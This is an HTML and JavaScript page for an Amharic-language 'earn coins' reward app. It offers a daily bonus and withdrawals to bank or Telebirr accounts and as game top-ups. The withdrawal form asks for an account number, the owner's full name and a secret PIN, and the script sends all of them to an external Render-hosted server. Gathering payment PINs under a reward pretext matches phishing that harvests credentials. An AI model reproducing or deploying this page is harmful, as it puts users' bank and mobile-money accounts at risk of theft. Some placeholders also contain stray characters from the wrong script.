<!DOCTYPE html>
<html lang="am">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FAF HUB - Earn Coins</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f0f12; color: #ffffff; text-align: center; padding: 20px; margin: 0; }
        .card { background: #1a1a24; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); max-width: 400px; margin: 20px auto; }
        h1 { color: #2ecc71; margin-bottom: 5px; font-size: 28px; }
        .balance-box { font-size: 24px; font-weight: bold; color: #f1c40f; margin: 15px 0; }
        .btn { background: #2ecc71; color: white; border: none; padding: 12px 30px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; box-sizing: border-box; transition: 0.3s; }
        .btn:disabled { background: #484854; cursor: not-allowed; }
        .btn-withdraw { background: #3498db; margin-top: 15px; }
        .form-group { text-align: left; margin: 15px 0; }
        label { font-size: 14px; color: #bdc3c7; display: block; margin-bottom: 5px; }
        input, select { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #2c2c3e; background: #252538; color: white; box-sizing: border-box; font-size: 15px; }
        #statusMessage { margin-top: 20px; padding: 12px; border-radius: 8px; font-weight: bold; display: none; }
        .success { background: #27ae60; color: white; }
        .error { background: #c0392b; color: white; }
        .loading { background: #d35400; color: white; animation: pulse 1.5s infinite; }
        .rate-info { font-size: 12px; color: #7f8c8d; margin-top: 5px; }
        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
    </style>
</head>
<body>

    <div class="card">
        <h1>📱 FAF HUB</h1>
        <div class="balance-box">💰 <span id="balance">0.00</span> FAF Coins</div>
        <div class="rate-info">( 2 FAF Coins = 1 ETB )</div>
        
        <!-- 1. ዕለታዊ ቦነስ ቁልፍ -->
        <button id="bonusBtn" class="btn" onclick="claimDailyBonus()">🎁 Claim Daily Bonus (+2 Coins)</button>
    </div>

    <div class="card">
        <h3>💸 የሽልማት ማውጫ ፎርም</h3>
        
        <!-- ማውጫ አይነት መምረጫ -->
        <div class="form-group">
            <label>የማውጫ መንገድ ይምረጡ</label>
            <select id="withdrawMethod" onchange="toggleFormLabels()">
                <option value="bank">የባንክ / ቴሌብር ሂሳብ (50 ETB = 100 Coins)</option>
                <option value="pubg">PUBG UC ቶፕ-አፕ (60 UC = 400 Coins)</option>
                <option value="ff">Free Fire Diamond (50 Diamonds = 400 Coins)</option>
            </select>
        </div>

        <div class="form-group">
            <label id="accLabel">የባንክ / ቴሌብር አካውንት ቁጥር</label>
            <input type="text" id="accountInput" placeholder="ቁጥር ወይም አይዲ ያስገቡ">
        </div>

        <div class="form-group">
            <label id="nameLabel">የአካውንቱ ባለቤት ሙሉ ስም</label>
            <input type="text" id="nameInput" placeholder="ሙሉ ስም ያስገቡ">
        </div>

        <div class="form-group">
            <label>ሚስጥራዊ ፒን ኮድ (PIN)</label>
            <input type="password" id="pinInput" placeholder="••••" maxlength="4">
        </div>

        <button class="btn btn-withdraw" onclick="submitWithdraw()">🚀 የክፍያ ጥያቄ ላክ</button>
        
        <!-- የሁኔታ ማሳወቂያ መልእክት -->
        <div id="statusMessage"></div>
    </div>

    <script {timestamp=2026-07-24}>
        let userId = "12345678"; // ከቴሌግራም ዌብ አፕ የመጣው የተጠቃሚ ID 
        let serverUrl = "https://faf-earning-money.onrender.com"; // ያንተ የሬንደር ሰርቨር ሊንክ

        function showStatus(text, type) {
            let el = document.getElementById('statusMessage');
            el.style.display = "block";
            el.innerText = text;
            el.className = type;
        }

        function toggleFormLabels() {
            let method = document.getElementById('withdrawMethod').value;
            let accLabel = document.getElementById('accLabel');
            let nameLabel = document.getElementById('nameLabel');
            let accInput = document.getElementById('accountInput');
            let nameInput = document.getElementById('nameInput');

            if (method === 'bank') {
                accLabel.innerText = "የባንክ / ቴሌብር አካውንት ቁጥር";
                nameLabel.innerText = "የአካውንቱ ባለቤት ሙሉ ስም";
                accInput.placeholder = "ဥምሳሌ: 0912345678";
                nameInput.placeholder = "ሙሉ ስም ያስገቡ";
            } else {
                accLabel.innerText = "የጌም Player ID (ቁጥር ብቻ)";
                nameLabel.innerText = "የጌም ውስጥ ስም (In-Game Name)";
                accInput.placeholder = "ဥምሳሌ: 5123456789";
                nameInput.placeholder = "የጌም ስም ያስገቡ";
            }
        }

        async function claimDailyBonus() {
            showStatus("⏳ ቦነስ በመፈተሽ ላይ...", "loading");
            try {
                let response = await fetch(`${serverUrl}/api/daily-bonus`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user_id: userId })
                });
                let data = await response.json();
                if(data.success) {
                    document.getElementById('balance').innerText = data.new_balance.toFixed(2);
                    showStatus(data.message, "success");
                    document.getElementById('bonusBtn').disabled = true;
                } else {
                    showStatus(data.message, "error");
                }
            } catch(e) {
                showStatus("❌ ሰርቨር መገናኘት አልተቻለም!", "error");
            }
        }

        async function submitWithdraw() {
            let method = document.getElementById('withdrawMethod').value;
            let acc = document.getElementById('accountInput').value;
            let name = document.getElementById('nameInput').value;
            let pin = document.getElementById('pinInput').value;

            if(!acc || !name || !pin) {
                showStatus("❌ እባክዎ ሁሉንም ሳጥኖች በትክክል ይሙሉ!", "error");
                return;
            }

            showStatus("⏳ በመላክ ላይ... እባክዎ ይጠብቁ", "loading");

            // በምርጫው መሠረት የሚያስፈልገው ኮይን ስሌት
            let requiredCoins = (method === 'bank') ? 100 : 400;

            try {
                let response = await fetch(`${serverUrl}/api/withdraw`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        user_id: userId,
                        method: method,
                        account: acc,
                        holder_name: name,
                        pin_code: pin,
                        amount: requiredCoins
                    })
                });
                let data = await response.json();
                if(data.success) {
                    showStatus(data.message, "success");
                } else {
                    showStatus(data.message, "error");
                }
            } catch(e) {
                showStatus("❌ አልተላከም! የኔትወርክ ችግር አጋጥሟል፣ ድጋሚ ይሞክሩ።", "error");
            }
        }
    </script>
</body>
</html>
